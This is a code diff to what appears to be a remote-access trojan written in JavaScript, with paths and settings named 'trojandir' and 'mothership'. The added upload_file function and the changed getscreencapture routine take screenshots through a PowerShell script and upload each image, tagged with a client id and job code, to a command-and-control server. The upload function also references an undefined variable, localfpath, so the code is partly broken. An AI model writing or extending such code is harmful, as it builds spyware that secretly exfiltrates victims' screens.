@@ -4007,6 +4007,35 @@ function getDirInfo(dirPath) {
     return fileDetails;
 }
 
+// TODO
+async function upload_file(filename, jobcode, localfname, localdir) {
+
+    if ( isNullOrWhitespace(filename) ) {
+        throw new Error('filename is null or empty');
+    }
+
+    localdir = isNullOrWhitespace(localdir) ? systemstate.trojandir : localdir;
+    localfname = isNullOrWhitespace(localfname) ? filename : localfname;
+    
+    let baseUrl = systemstate.mothership + "/ow/upload.php";
+
+    let tfilename = `clientid_${systemstate.clientid}_jobcode_${jobcode}_${localfname}`;
+
+    let kvp = systemstate.statekvp;
+    kvp['filename'] = tfilename;
+    kvp['jobcode'] = jobcode;
+
+    let response = await makePUTRequest(
+        baseUrl,
+        kvp,
+        null,
+        localfpath
+    );
+
+    return response;
+}
+
+
 function exec_getscreencapture() {
 
     return new Promise((resolve, reject) => {
@@ -4015,7 +4044,7 @@ function exec_getscreencapture() {
         let fpath = path.join(systemstate.trojandir, 'get_full_screen_capture.ps1');
     
         let childp = execPSScript(fpath, 
-            systemstate.trojandir, 
+            [systemstate.trojandir], 
             null, 
             (text) => stdout+=text, 
             (text) => stdout+=text, 
@@ -4028,11 +4057,25 @@ function exec_getscreencapture() {
 async function getscreencapture() {
     logmsg("starting");
 
+    let runningcmd = systemstate.cmdconfig;
+
     // TODO: log event startjob
+
     let stdout = await exec_getscreencapture();
 
-    logmsg(stdout);
+    let lines = stdout.split(/\r?\n/);
 
+    for ( let i = 0; i<lines.length; i++ ) {
+        let line = lines[i];
+        
+        if ( line.startsWith('filepath=') ) {
+            let fpath = line.split('=')[1];
+            let fname = path.basename(fpath);
+
+            await upload_file(fname,runningcmd.jobcode);
+        }
+    }
+    
     // TODO: log event job_finished
 }
 
@@ -4586,5 +4629,5 @@ outgoing result
       "payload" --> holds result object from executing incoming cmd
     }
 
-
+ 
 */
